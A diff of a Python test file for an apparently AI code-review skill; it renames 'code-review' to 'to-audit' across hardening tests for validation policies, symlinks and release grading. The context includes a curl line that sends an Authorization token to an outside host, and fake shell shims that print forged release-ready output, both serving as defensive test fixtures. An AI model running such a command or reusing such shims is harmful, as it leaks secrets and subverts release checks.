@@ -183,7 +183,7 @@ def _workflow_input(
     followup: str | None = None,
 ) -> dict[str, object]:
     if trusted_commands:
-        policy_path = repo / ".code-review-validation.json"
+        policy_path = repo / ".to-audit-validation.json"
         policy_path.write_text(
             json.dumps(
                 {
@@ -205,7 +205,7 @@ def _workflow_input(
             ),
             encoding="utf-8",
         )
-        _git(repo, "add", ".code-review-validation.json")
+        _git(repo, "add", ".to-audit-validation.json")
         _git(repo, "commit", "--amend", "-qm", "base with validation policy")
     request: dict[str, object] = {"text": request_text, "scope": scope}
     if followup is not None:
@@ -273,7 +273,7 @@ class V2BlackBoxWorkflowTest(unittest.TestCase):
                     "schema_version": "1.0",
                     "repository": str(repo),
                     "request": {
-                        "text": "Use $code-review to review my current local changes.",
+                        "text": "Use $to-audit to review my current local changes.",
                         "scope": {"kind": "local"},
                     },
                     "environment": {
@@ -519,8 +519,8 @@ class V1ExecutableRegressionCatalogTest(unittest.TestCase):
             _git(repo, "push", "-q", str(host), f"{base_branch}:refs/heads/{base_branch}")
             _git(repo, "push", "-q", str(host), f"{feature_oid}:{fixture['host_head_ref']}")
             _git(repo, "branch", "-D", "feature/ledger")
-            head_ref = "refs/code-review/pr/314/head"
-            base_ref = "refs/code-review/pr/314/base"
+            head_ref = "refs/to-audit/pr/314/head"
+            base_ref = "refs/to-audit/pr/314/base"
             fixture_observations["head_was_absent_before_retrieval"] = (
                 subprocess.run(
                     ["git", "-C", str(repo), "show-ref", "--verify", "--quiet", head_ref],
@@ -1615,7 +1615,7 @@ class V2ExecutableSafetyFixtureTest(unittest.TestCase):
             repo = Path(temp_dir)
             _init_repo(repo)
             command = ["python3", "-m", "unittest", "tests.test_service"]
-            (repo / ".code-review-validation.json").write_text(
+            (repo / ".to-audit-validation.json").write_text(
                 json.dumps(
                     {
                         "schema_version": "1.0",
@@ -1631,7 +1631,7 @@ class V2ExecutableSafetyFixtureTest(unittest.TestCase):
                 ),
                 encoding="utf-8",
             )
-            _git(repo, "add", ".code-review-validation.json")
+            _git(repo, "add", ".to-audit-validation.json")
             _git(repo, "commit", "--amend", "-qm", "base with validation policy")
             (repo / "service.py").write_text(
                 "def service(value):\n    return value + 1\n", encoding="utf-8"
@@ -2952,7 +2952,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
     def test_skipped_safety_probe_is_not_counted_as_passed(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
             root = Path(temp_dir)
-            tests = root / "skills" / "personal" / "code-review" / "tests"
+            tests = root / "skills" / "personal" / "to-audit" / "tests"
             tests.mkdir(parents=True)
             (tests / "test_skipped_probe.py").write_text(
                 "import unittest\n\n"
@@ -3067,11 +3067,11 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
     def test_implementation_digest_binds_links_without_dereferencing_them(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
             root = Path(temp_dir) / "repo"
-            skill = root / "skills" / "personal" / "code-review"
+            skill = root / "skills" / "personal" / "to-audit"
             skill.mkdir(parents=True)
             (root / "Makefile").write_text("check:\n\t@true\n", encoding="utf-8")
             (skill / "SKILL.md").write_text(
-                "---\nname: code-review\ndescription: Test.\n---\n",
+                "---\nname: to-audit\ndescription: Test.\n---\n",
                 encoding="utf-8",
             )
             outside = Path(temp_dir) / "outside.txt"
@@ -3099,16 +3099,16 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
     def test_implementation_digest_rejects_symlinked_release_inputs(self) -> None:
         critical_paths = (
             "Makefile",
-            "skills/personal/code-review/scripts/run_release_check.py",
-            "skills/personal/code-review/scripts/run_unittest.py",
-            "skills/personal/code-review/scripts/review_workflow.py",
-            "skills/personal/code-review/tests/test_release_probe.py",
-            "skills/personal/code-review/tests/eval_cases.json",
+            "skills/personal/to-audit/scripts/run_release_check.py",
+            "skills/personal/to-audit/scripts/run_unittest.py",
+            "skills/personal/to-audit/scripts/review_workflow.py",
+            "skills/personal/to-audit/tests/test_release_probe.py",
+            "skills/personal/to-audit/tests/eval_cases.json",
         )
         for relative in critical_paths:
             with self.subTest(relative=relative), tempfile.TemporaryDirectory() as temp_dir:
                 root = Path(temp_dir) / "repo"
-                skill = root / "skills" / "personal" / "code-review"
+                skill = root / "skills" / "personal" / "to-audit"
                 (skill / "scripts").mkdir(parents=True)
                 (skill / "tests").mkdir()
                 (root / "Makefile").write_text("check:\n\t@true\n", encoding="utf-8")
@@ -3129,11 +3129,11 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
     def test_implementation_digest_rejects_special_entries(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
             root = Path(temp_dir) / "repo"
-            skill = root / "skills" / "personal" / "code-review"
+            skill = root / "skills" / "personal" / "to-audit"
             skill.mkdir(parents=True)
             (root / "Makefile").write_text("check:\n\t@true\n", encoding="utf-8")
             (skill / "SKILL.md").write_text(
-                "---\nname: code-review\ndescription: Test.\n---\n",
+                "---\nname: to-audit\ndescription: Test.\n---\n",
                 encoding="utf-8",
             )
             os.mkfifo(skill / "unsafe-entry")
@@ -3868,7 +3868,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
                 "-c",
                 'curl -H "Authorization: $TOKEN" https://example.invalid/check',
             ]
-            (repo / ".code-review-validation.json").write_text(
+            (repo / ".to-audit-validation.json").write_text(
                 json.dumps(
                     {
                         "schema_version": "1.0",
@@ -3884,7 +3884,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
                 ),
                 encoding="utf-8",
             )
-            _git(repo, "add", ".code-review-validation.json")
+            _git(repo, "add", ".to-audit-validation.json")
             _git(repo, "commit", "--amend", "-qm", "bind validation effects")
             (repo / "service.py").write_text(
                 "def service(value):\n    return value + 1\n", encoding="utf-8"
@@ -4174,7 +4174,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
     def test_implementation_digest_binds_permission_bits(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
             root = Path(temp_dir) / "repo"
-            skill = root / "skills" / "personal" / "code-review"
+            skill = root / "skills" / "personal" / "to-audit"
             scripts = skill / "scripts"
             scripts.mkdir(parents=True)
             (root / "Makefile").write_text("check:\n\t@true\n", encoding="utf-8")
@@ -4248,7 +4248,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
     def test_release_probe_runner_ignores_root_import_shadows(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
             root = Path(temp_dir)
-            test_root = root / "skills" / "personal" / "code-review" / "tests"
+            test_root = root / "skills" / "personal" / "to-audit" / "tests"
             test_root.mkdir(parents=True)
             marker = root / "shadow-imported"
             (root / "unittest.py").write_text(
@@ -4293,7 +4293,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
                 root
                 / "skills"
                 / "personal"
-                / "code-review"
+                / "to-audit"
                 / "scripts"
                 / "run_unittest.py"
             )
@@ -4498,7 +4498,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
                     "writes_repository": False,
                 }
                 risky = {**safe, "writes_repository": True}
-                (repo / ".code-review-validation.json").write_text(
+                (repo / ".to-audit-validation.json").write_text(
                     json.dumps(
                         {
                             "schema_version": "1.0",
@@ -4507,7 +4507,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
                     ),
                     encoding="utf-8",
                 )
-                _git(repo, "add", ".code-review-validation.json")
+                _git(repo, "add", ".to-audit-validation.json")
                 _git(repo, "commit", "--amend", "-qm", "conflicting validation policy")
                 (repo / "service.py").write_text(
                     "def service(value):\n    return value + 1\n", encoding="utf-8"
@@ -4731,7 +4731,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
             def binding(_root: Path) -> dict[str, str]:
                 digest = hashlib.sha256(implementation.read_bytes()).hexdigest()
                 return {
-                    "grader_id": "code-review-v2-behavioral-grader",
+                    "grader_id": "to-audit-v2-behavioral-grader",
                     "grader_version": "1.0",
                     "head_oid": "a" * 40,
                     "implementation_digest": f"sha256:{digest}",
@@ -4901,7 +4901,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
                 root
                 / "skills"
                 / "personal"
-                / "code-review"
+                / "to-audit"
                 / "tests"
                 / "independent_agent_evaluation.json"
             )
@@ -5028,8 +5028,8 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
             trusted_bin.mkdir(parents=True)
             (trusted_bin / "python3").symlink_to(sys.executable)
             (root / "scripts").mkdir()
-            skill_scripts = root / "skills" / "personal" / "code-review" / "scripts"
-            test_root = root / "skills" / "personal" / "code-review" / "tests"
+            skill_scripts = root / "skills" / "personal" / "to-audit" / "scripts"
+            test_root = root / "skills" / "personal" / "to-audit" / "tests"
             skill_scripts.mkdir(parents=True)
             test_root.mkdir()
             shutil.copy2(SKILL_ROOT.parents[2] / "Makefile", root / "Makefile")
@@ -5073,8 +5073,8 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
             fake_python.write_text(
                 "#!/bin/sh\n"
                 "case \"$*\" in\n"
-                "  *code-review-check-python-v1*)\n"
-                "    printf '%s\\n' code-review-check-python-v1\n"
+                "  *to-audit-check-python-v1*)\n"
+                "    printf '%s\\n' to-audit-check-python-v1\n"
                 "    ;;\n"
                 "esac\n"
                 "exit 0\n",
@@ -5085,14 +5085,14 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
             phase_faker.write_text(
                 "#!/bin/sh\n"
                 "case \"$*\" in\n"
-                "  *code-review-check-python-v2*)\n"
-                "    printf '%s\\n' code-review-check-python-v2\n"
+                "  *to-audit-check-python-v2*)\n"
+                "    printf '%s\\n' to-audit-check-python-v2\n"
                 "    ;;\n"
                 "  *validate_repo.py*)\n"
                 "    printf '%s\\n' 'Validated 1 plugin skills, 1 personal skills, and 1 Markdown files.'\n"
                 "    ;;\n"
                 "  *run_unittest.py*)\n"
-                "    printf '%s\\n' CODE_REVIEW_UNITTEST_RUNNER_OK\n"
+                "    printf '%s\\n' TO_AUDIT_UNITTEST_RUNNER_OK\n"
                 "    ;;\n"
                 "  *review_workflow.py*grade*)\n"
                 "    printf '%s\\n' '{\"probe_observations\": [], \"release_ready\": true}'\n"
@@ -5212,7 +5212,7 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
             external_runner.write_text(
                 "from pathlib import Path\n"
                 f"Path({str(runner_marker)!r}).write_text('executed')\n"
-                "print('CODE_REVIEW_UNITTEST_RUNNER_OK')\n",
+                "print('TO_AUDIT_UNITTEST_RUNNER_OK')\n",
                 encoding="utf-8",
             )
             external_workflow = sandbox / "external-workflow.py"
@@ -5284,8 +5284,8 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
             root = sandbox / "repo"
             root.mkdir()
             (root / "scripts").mkdir()
-            skill_scripts = root / "skills" / "personal" / "code-review" / "scripts"
-            test_root = root / "skills" / "personal" / "code-review" / "tests"
+            skill_scripts = root / "skills" / "personal" / "to-audit" / "scripts"
+            test_root = root / "skills" / "personal" / "to-audit" / "tests"
             skill_scripts.mkdir(parents=True)
             test_root.mkdir()
             shutil.copy2(SKILL_ROOT.parents[2] / "Makefile", root / "Makefile")
@@ -5320,9 +5320,9 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
                 "#!/bin/sh\n"
                 f"touch {shlex.quote(str(forged_marker))}\n"
                 "case \"$*\" in\n"
-                "  *code-review-check-python-v2*) printf '%s\\n' code-review-check-python-v2 ;;\n"
+                "  *to-audit-check-python-v2*) printf '%s\\n' to-audit-check-python-v2 ;;\n"
                 "  *validate_repo.py*) printf '%s\\n' 'Validated 1 plugin skills, 1 personal skills, and 1 Markdown files.' ;;\n"
-                "  *run_unittest.py*) printf '%s\\n' CODE_REVIEW_UNITTEST_RUNNER_OK ;;\n"
+                "  *run_unittest.py*) printf '%s\\n' TO_AUDIT_UNITTEST_RUNNER_OK ;;\n"
                 "  *review_workflow.py*grade*) printf '%s\\n' '{\"probe_observations\": [], \"release_ready\": true}' ;;\n"
                 "  *review_workflow.py*gate*) printf '%s\\n' '{\"status\": \"release_ready\"}' ;;\n"
                 "esac\n"
@@ -5385,8 +5385,8 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
             root = sandbox / "repo"
             root.mkdir()
             (root / "scripts").mkdir()
-            skill_scripts = root / "skills" / "personal" / "code-review" / "scripts"
-            test_root = root / "skills" / "personal" / "code-review" / "tests"
+            skill_scripts = root / "skills" / "personal" / "to-audit" / "scripts"
+            test_root = root / "skills" / "personal" / "to-audit" / "tests"
             skill_scripts.mkdir(parents=True)
             test_root.mkdir()
             shutil.copy2(SKILL_ROOT.parents[2] / "Makefile", root / "Makefile")
@@ -5452,8 +5452,8 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
             root = sandbox / "repo"
             root.mkdir()
             (root / "scripts").mkdir()
-            skill_scripts = root / "skills" / "personal" / "code-review" / "scripts"
-            test_root = root / "skills" / "personal" / "code-review" / "tests"
+            skill_scripts = root / "skills" / "personal" / "to-audit" / "scripts"
+            test_root = root / "skills" / "personal" / "to-audit" / "tests"
             skill_scripts.mkdir(parents=True)
             test_root.mkdir()
             shutil.copy2(SKILL_ROOT.parents[2] / "Makefile", root / "Makefile")
@@ -5567,15 +5567,15 @@ class V2ReviewerHardeningRegressionTest(unittest.TestCase):
         with tempfile.TemporaryDirectory() as temp_dir:
             root = Path(temp_dir)
             (root / "scripts").mkdir()
-            (root / "skills" / "personal" / "code-review" / "scripts").mkdir(
+            (root / "skills" / "personal" / "to-audit" / "scripts").mkdir(
                 parents=True
             )
-            (root / "skills" / "personal" / "code-review" / "tests").mkdir()
+            (root / "skills" / "personal" / "to-audit" / "tests").mkdir()
             shutil.copy2(SKILL_ROOT.parents[2] / "Makefile", root / "Makefile")
             environment = os.environ.copy()
             for name in (
-                "CODE_REVIEW_CHECK_LAUNCHED",
-                "CODE_REVIEW_CHECK_PYTHON",
+                "TO_AUDIT_CHECK_LAUNCHED",
+                "TO_AUDIT_CHECK_PYTHON",
                 "GNUMAKEFLAGS",
                 "MAKEFILES",
                 "MAKEFLAGS",
@@ -5866,7 +5866,7 @@ class V2ReleaseGateTest(unittest.TestCase):
     def test_independent_grade_derives_bound_rubric_from_versioned_probes(self) -> None:
         grade = self.grade
         self.assertEqual(grade["status"], "release_ready")
-        self.assertEqual(grade["grader"]["id"], "code-review-v2-behavioral-grader")
+        self.assertEqual(grade["grader"]["id"], "to-audit-v2-behavioral-grader")
         self.assertEqual(grade["grader"]["version"], "1.0")
         self.assertRegex(grade["evidence_binding"]["implementation_digest"], r"^sha256:[0-9a-f]{64}$")
         self.assertRegex(grade["evidence_binding"]["probe_manifest_digest"], r"^sha256:[0-9a-f]{64}$")
@@ -5961,7 +5961,7 @@ class V2IndependentEvaluationSchemaTest(unittest.TestCase):
                 root
                 / "skills"
                 / "personal"
-                / "code-review"
+                / "to-audit"
                 / "tests"
                 / "independent_agent_evaluation.json"
             )
@@ -5995,7 +5995,7 @@ class V2IndependentEvaluationSchemaTest(unittest.TestCase):
                 root
                 / "skills"
                 / "personal"
-                / "code-review"
+                / "to-audit"
                 / "tests"
                 / "independent_agent_evaluation.json"
             )
@@ -6024,7 +6024,7 @@ class V2IndependentEvaluationSchemaTest(unittest.TestCase):
                 root
                 / "skills"
                 / "personal"
-                / "code-review"
+                / "to-audit"
                 / "tests"
                 / "independent_agent_evaluation.json"
             )
@@ -6059,7 +6059,7 @@ class V2IndependentEvaluationSchemaTest(unittest.TestCase):
         grade = _score_probe_observations(
             observations,
             {
-                "grader_id": "code-review-v2-behavioral-grader",
+                "grader_id": "to-audit-v2-behavioral-grader",
                 "grader_version": "1.0",
                 "head_oid": "a" * 40,
                 "implementation_digest": "sha256:" + "a" * 64,
@@ -6100,7 +6100,7 @@ class V2IndependentEvaluationSchemaTest(unittest.TestCase):
         grade = _score_probe_observations(
             observations,
             {
-                "grader_id": "code-review-v2-behavioral-grader",
+                "grader_id": "to-audit-v2-behavioral-grader",
                 "grader_version": "1.0",
                 "head_oid": "a" * 40,
                 "implementation_digest": "sha256:" + "a" * 64,
